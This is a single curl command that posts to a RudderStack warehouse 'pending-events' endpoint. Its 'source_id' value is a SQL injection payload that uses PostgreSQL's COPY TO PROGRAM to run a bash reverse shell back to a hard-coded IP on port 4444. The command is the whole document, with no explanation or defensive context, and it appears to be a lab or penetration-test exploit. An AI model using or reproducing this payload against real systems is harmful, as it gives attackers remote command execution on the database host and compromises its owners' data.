curl http://rudderstack:8080/v1/warehouse/pending-events \
  -X POST \
  -H 'Content-Type:application/json' \
  -d '{"source_id":"1\'; copy (select $$a$$) to program $$bash -c \'bash -i >& /dev/tcp/192.168.45.156/4444 0>&1\'$$;-- -"}'

